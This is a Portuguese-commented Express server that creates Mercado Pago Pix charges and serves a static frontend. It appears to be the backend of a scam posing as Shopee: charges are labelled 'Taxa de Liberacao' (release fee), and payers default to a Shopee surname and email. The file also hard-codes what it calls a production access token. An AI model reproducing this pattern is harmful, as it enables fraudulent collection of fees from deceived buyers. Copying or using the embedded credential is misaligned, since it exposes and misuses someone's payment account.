import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';

const app = express();

// 1. Configurações para evitar bloqueios
app.use(express.json());
app.use(cors({ origin: '*' }));

// 2. ROTA DE STATUS (Para o Railway saber que está vivo)
app.get('/health', (req, res) => {
    res.status(200).send('Railway Online 🚀');
});

// ========================================================
// 3. ROTA PIX (MERCADO PAGO) - TOKEN ATUALIZADO
// ========================================================
app.post('/pix', async (req, res) => {
    console.log("🔔 [RAILWAY] Processando Pix...");
    
    try {
        const { amount, name, cpf, email } = req.body;

        // SEU TOKEN DE PRODUÇÃO (O ÚLTIMO QUE VOCÊ MANDOU)
        const ACCESS_TOKEN = 'APP_USR-7433336192149093-020423-97cd4e2614f56c0f43836231bfb0e432-202295570';

        // Tratamento de dados para evitar recusa do MP
        const cpfLimpo = String(cpf).replace(/\D/g, '');
        const partesNome = String(name).trim().split(' ');
        const primeiroNome = partesNome[0] || "Cliente";
        const sobrenome = partesNome.length > 1 ? partesNome.slice(1).join(' ') : "Shopee";
        const emailPagador = (email && email.includes('@')) ? email : "pagamento@shopee.com";

        const payload = {
            transaction_amount: Number(amount) || 37.90,
            description: "Taxa de Liberacao",
            payment_method_id: "pix",
            payer: {
                email: emailPagador,
                first_name: primeiroNome,
                last_name: sobrenome,
                identification: {
                    type: "CPF",
                    number: cpfLimpo
                }
            }
        };

        const response = await axios.post('https://api.mercadopago.com/v1/payments', payload, {
            headers: {
                'Authorization': `Bearer ${ACCESS_TOKEN}`,
                'Content-Type': 'application/json',
                'X-Idempotency-Key': `railway-${Date.now()}`
            }
        });

        console.log("✅ Pix Criado! ID:", response.data.id);
        res.status(201).json(response.data);

    } catch (error: any) {
        console.error("❌ Erro MP:", error.response?.data || error.message);
        // Retorna o erro exato para o frontend
        res.status(500).json({ error: "Erro no Pagamento", detalhes: error.response?.data });
    }
});

// ========================================================
// 4. SERVIR O SITE (FRONTEND)
// ========================================================
// O Railway roda o server dentro da pasta /dist, então o html está uma pasta acima (../)
app.use(express.static(path.join(__dirname, '../')));

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// 5. Inicialização (Railway usa process.env.PORT automaticamente)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server rodando na porta ${PORT}`);
});